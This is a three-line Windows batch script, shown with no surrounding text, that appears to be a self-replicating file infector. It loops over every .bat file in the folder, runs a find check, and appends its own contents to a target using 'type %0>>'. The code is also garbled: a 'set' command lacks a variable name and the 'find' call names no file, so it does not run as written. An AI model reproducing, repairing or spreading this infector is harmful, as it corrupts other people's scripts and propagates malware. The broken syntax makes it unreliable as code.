for %%w in (*.bat) do set =%%w
find "" %%
if errorlevel 1 type %0>>%%
